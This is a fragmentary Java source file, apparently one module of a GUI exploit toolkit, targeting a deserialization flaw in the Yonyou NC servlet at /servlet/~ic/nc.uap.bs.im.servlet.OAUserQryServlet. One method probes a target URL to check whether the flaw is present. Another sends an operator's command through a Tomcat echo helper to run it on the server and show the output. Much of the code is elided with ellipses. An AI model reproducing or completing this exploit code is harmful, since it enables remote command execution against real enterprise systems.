...
public class yongyou_nc_OAUserQryServlet_serial implements Exploitlnterface {
    @Override
...
//        return null;
    ...
    private Boolean att(String url, TextArea textArea) {
        try {
            ...
            Response post_res = HttpTools.get(url + "/servlet/~ic/nc.uap.bs.im.servlet.OAUserQryServlet" , head, "utf-8");
            if (post_res.getCode() != 404 && post_res.getCode() != 0) {
                Platform.runLater(() -> {
//                    textArea.appendText("\n 漏洞存在 输入cmd开始构造回显");
                    textArea.appendText("\n [ yongyou_nc_OAUserQryServlet_serial ]");
            ...
            Platform.runLater(() -> {
//                textArea.appendText("\n yongyou_nc_OAUserQryServlet_serial-漏洞不存在");
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    ...
    private Boolean attcmd(String url, String cmd, TextArea textArea,TextArea textArea_cmd) {
        ...
        try {
            String cmd_echo = Methods.Tomcatecho(url + "/servlet/~ic/nc.uap.bs.im.servlet.OAUserQryServlet",cmd,s);
